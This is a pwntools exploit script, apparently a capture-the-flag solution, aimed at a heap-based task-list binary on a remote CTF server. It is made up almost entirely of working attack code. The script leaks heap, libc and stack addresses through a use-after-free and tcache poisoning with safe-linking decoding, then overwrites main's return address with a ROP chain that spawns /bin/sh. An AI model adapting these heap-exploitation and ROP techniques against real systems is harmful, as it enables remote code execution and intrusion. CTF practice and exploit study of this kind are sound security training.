from pwn import *

context.binary = elf = ELF("../dist/main")
libc = ELF("../dist/libc.so.6")
assert libc

# p = elf.process()
p = remote("tasks.ctf.ingeniums.club", 1337, ssl=True)
assert p


def sendopt(opt):
    p.sendlineafter(b"> ", str(opt).encode())


def create_list(title):
    sendopt(1)
    p.sendlineafter(b"title: ", title)


def create_task(title, content):
    sendopt(2)
    p.sendlineafter(b"title: ", title)
    p.sendlineafter(b"content: ", content)


def edit(idx, data):
    sendopt(3)
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendafter(b"content: ", data)


def add_task_to_list(idx, task):
    sendopt(4)
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"index: ", str(task).encode())


def remove_task_from_list(idx, task):
    sendopt(5)
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"index: ", str(task).encode())


def list_lists():
    sendopt(6)


def list_tasks(idx):
    sendopt(7)
    p.sendlineafter(b"index: ", str(idx).encode())


def use_scratchpad(data):
    sendopt(8)
    p.sendafter(b"> ", data)


create_list(b"AAAABBBB")
create_task(b"BBBB", b"CCCC")
create_task(b"BBBB", b"CCCC")

add_task_to_list(0, 0)
add_task_to_list(0, 1)
remove_task_from_list(0, 1)
remove_task_from_list(0, 0)
add_task_to_list(0, 0)
add_task_to_list(0, 1)
list_tasks(0)

p.recvuntil(b"> ")
p.recvuntil(b"> ")

# heap leak

heap = u64(p.recvline()[:-1].strip().ljust(8, b"\x00")) << 12
prot = lambda x: x ^ (heap >> 12)

log.info(f"heap: {hex(heap)}")

# house of orange

TOP_CHUNK = heap + 0x480

edit(0, p64(prot(TOP_CHUNK)))


create_task(b"BBBB", b"CCCC")
create_task(b"BBBB", b"CCCC")
edit(3, b"A" * 8 + p64(0xB81))

use_scratchpad(b"A" * 50)

# leak libc

create_list(b"AAAABBBB")
create_task(b"BBBB", b"CCCC")
create_task(b"BBBB", b"CCCC")

add_task_to_list(1, 4)
add_task_to_list(1, 5)
remove_task_from_list(1, 1)
remove_task_from_list(1, 0)
add_task_to_list(1, 4)
add_task_to_list(1, 5)

TARGET = heap + 0x330
LIBC_ADDR = heap + 0x5E0

edit(4, p64(prot(TARGET)))

create_task(b"BBBB", b"CCCC")
create_task(b"BBBB", b"CCCC")
edit(7, p64(LIBC_ADDR) + p64(8))
list_tasks(0)

p.recvuntil(b"- ")

libc.address = u64(p.recvline()[:-1]) - 0x1D8B20 - 0x2B000

log.info(f"libc: {hex(libc.address)}")

# leak stack

edit(7, p64(libc.symbols["environ"]) + p64(8))
list_tasks(0)

p.recvuntil(b"- ")

MAIN_RET = u64(p.recvline()[:-1]) - 0x138

log.info(f"main_ret: {hex(MAIN_RET)}")

# ROP

create_list(b"AAAABBBB")
create_task(b"BBBB", b"CCCC")
create_task(b"BBBB", b"CCCC")


add_task_to_list(2, 8)
add_task_to_list(2, 9)
remove_task_from_list(2, 1)
remove_task_from_list(2, 0)
add_task_to_list(2, 8)
add_task_to_list(2, 9)


edit(8, p64(prot(MAIN_RET)))

create_task(b"BBBB", b"CCCC")
create_task(b"BBBB", b"CCCC")

r = ROP(libc)
r(rdi=next(libc.search(b"/bin/sh\x00")))
r.raw(libc.address + 0x582C2)

edit(11, b"A" * 8 + r.chain())
sendopt(9)

p.interactive()
